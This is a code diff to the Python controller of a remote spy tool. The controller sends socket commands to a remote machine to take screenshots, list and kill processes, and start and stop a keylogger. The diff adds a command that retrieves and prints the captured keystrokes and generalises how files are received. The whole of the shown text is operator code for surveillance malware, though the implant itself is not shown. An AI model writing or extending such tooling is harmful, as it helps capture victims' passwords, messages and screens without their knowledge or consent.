@@ -10,12 +10,17 @@ CMD_VIEW_PROCESSES = 'view_processes'
 CMD_KILL_PROCESS = 'kill_process'
 CMD_START_KEYLOGGER = 'start_keylogger'
 CMD_STOP_KEYLOGGER = 'stop_keylogger'
+CMD_PRINT_KEYLOGGER = 'print_keylogger'
+
+# FLAGS
+FLAG_FILE_END = 'FILE_END'
+FLAG_PROCESSES_END = 'PROCESSES_END'
 
 # BUFFER
 BUFFER_SIZE = 1024
 
 # SCREENSHOT
-SCREENSHOT_PATH = './tmp/'
+TMP_PATH = './tmp/'
 
 
 class Client:
@@ -53,11 +58,12 @@ class Client:
       3: Kill process
       4: Start key logger
       5: Stop key logger
-      6: Shutdown''')
+      6: Print key logger
+      7: Shutdown''')
       cmd = input('Enter command: ')
       if cmd == '1':
         self.take_screenshot()
-        self.receive_image()
+        self.receive_file(TMP_PATH, 'screenshot.png')
       elif cmd == '2':
         self.view_processes()
       elif cmd == '3':
@@ -68,6 +74,8 @@ class Client:
       elif cmd == '5':
         self.stop_keylogger()
       elif cmd == '6':
+        self.print_keylogger()
+      elif cmd == '7':
         self.shutdown()
         break
 
@@ -78,11 +86,11 @@ class Client:
   def take_screenshot(self):
     self.socket.send(CMD_TAKE_SCREENSHOT.encode())
 
-  def receive_image(self):
-    with open(os.path.join(SCREENSHOT_PATH, 'screenshot.png'), 'wb') as f:
+  def receive_file(self, path, file_name):
+    with open(os.path.join(path, file_name), 'wb') as f:
       while True:
         data = self.socket.recv(BUFFER_SIZE)
-        if data == b'IMAGE_END':
+        if data == FLAG_FILE_END.encode():
           break
         else:
           f.write(data)
@@ -93,15 +101,26 @@ class Client:
   def stop_keylogger(self):
     self.socket.send(CMD_STOP_KEYLOGGER.encode())
 
+  def print_keylogger(self):
+    self.socket.send(CMD_PRINT_KEYLOGGER.encode())
+    keys = ""
+    while True:
+      data = self.socket.recv(BUFFER_SIZE)
+      if data == FLAG_FILE_END.encode():
+        break
+      else:
+        keys += data.decode()
+    print(keys)
+
   def view_processes(self):
     self.socket.send(CMD_VIEW_PROCESSES.encode())
     processes = ""
     while True:
       data = self.socket.recv(BUFFER_SIZE)
-      if data == b'PROCESSES_END':
+      if data == FLAG_PROCESSES_END.encode():
         break
       else:
-        processes = data.decode()
+        processes += data.decode()
         
     print(processes)
       
